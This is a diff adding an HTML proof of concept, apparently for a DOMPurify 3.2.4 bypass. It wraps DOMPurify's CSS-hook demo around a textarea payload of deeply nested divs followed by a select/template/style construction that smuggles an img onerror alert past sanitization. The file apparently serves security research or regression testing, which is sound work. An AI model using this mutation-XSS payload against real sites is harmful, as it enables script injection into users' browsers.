@@ -1,0 +1,129 @@
+<!doctype html>
+<html>
+    <head>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.4/purify.js"></script>
+    </head>
+    <body>
+        <!-- The folloiwng CSS sanitization code is copied from https://github.com/cure53/DOMPurify/blob/f094f76f0bd66a603f06935a1ed715b05b60279b/demos/hooks-sanitize-css-demo.html -->
+        <!-- Our DIV to receive content -->
+        <div id="sanitized"></div>
+
+        <!-- Now let's sanitize that content -->
+        <script>
+            /* jshint globalstrict:true */
+            /* global DOMPurify */
+            'use strict';
+            window.onload = function(){
+            
+                // Specify dirty HTML
+                let dirty = document.getElementById('payload').value;
+
+                // We can allow all (default elements) but SVG
+                const config = {
+                    FORBID_TAGS: ['svg'] // SVG is not yet supported. Too messy.
+                };
+
+                // Specify CSS property whitelist
+                const allowed_properties = [
+                    'color', 
+                    'background',
+                    'border', 
+                    'padding', 
+                    'margin',
+                    'font-family',
+                    'content',
+                    'padding'
+                ];
+
+                // Specify if CSS functions are permitted
+                const allow_css_functions = true;
+
+                /**
+                 *  Take CSS property-value pairs and validate against white-list,
+                 *  then add the styles to an array of property-value pairs
+                 */
+                function validateStyles(output, styles) {
+                  Object.keys(styles).forEach(function(index) {
+                    if (styles.hasOwnProperty(index)) {
+                      let normalizedKey = styles[index].replace(/([A-Z])/g, '-$1').toLowerCase();
+                      if (allowed_properties.includes(normalizedKey)) {
+                        let value = styles[normalizedKey];
+                        output.push(`${normalizedKey}:${value};`);
+                      }
+                    }
+                  });
+                }
+
+                /**
+                 * Take CSS rules and analyze them, create string wrapper to
+                 * apply them to the DOM later on. Note that only selector rules 
+                 * are supported right now
+                 */
+                function addCSSRules(output, cssRules) {
+                    Array.from(cssRules).reverse().forEach(rule => {
+                        // check for rules with selector
+                        if (rule.type === 1 && rule.selectorText) {
+                            output.push(`${rule.selectorText}{`);
+                            if (rule.style) {
+                                validateStyles(output, rule.style);
+                            }
+                            output.push('}');
+                        }
+                    });
+                }
+
+                // Add a hook to enforce CSS element sanitization
+                DOMPurify.addHook('uponSanitizeElement', function(node, data) {
+                    if (data.tagName === 'style') {
+                        let output  = [];
+                        addCSSRules(output, node.sheet.cssRules);
+                        node.textContent = output.join("\n");
+                    }
+                });
+
+                // Add a hook to enforce CSS attribute sanitization
+                DOMPurify.addHook('afterSanitizeAttributes', function(node) {
+                    // Nasty hack to fix baseURI + CSS problems in Chrome
+                    if (!node.ownerDocument.baseURI) {
+                        let base = document.createElement('base');
+                        base.href = document.baseURI;
+                        node.ownerDocument.head.appendChild(base);
+                    }
+                    // Check all style attribute values and validate them
+                    if (node.hasAttribute('style')) {
+                        let output = [];
+                        validateStyles(output, node.style);
+                        // re-add styles in case any are left
+                        if (output.length) {
+                            node.setAttribute('style', output.join(""));
+                        } else {
+                            node.removeAttribute('style');
+                        }
+                    }
+                });
+
+                // Clean HTML string and write into our DIV
+                let clean = DOMPurify.sanitize(dirty, config);
+                document.getElementById('sanitized').innerHTML = clean;
+            }
+        </script>
+
+        <!--  Here we cage our payload in a TEXTAREA -->
+        <textarea id="payload">
+<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div>
+
+<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div>
+
+<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div>
+
+<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div>
+
+<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div>
+
+<div><div><div><div><div><div><div><div><div>
+
+<select><template><style>*{content:"<!--"}</style><template style="content:'--\></select><img src=x onerror=alert(document.domain)>'"></template></template></select>
+
+</textarea>
+</body>
+</html>
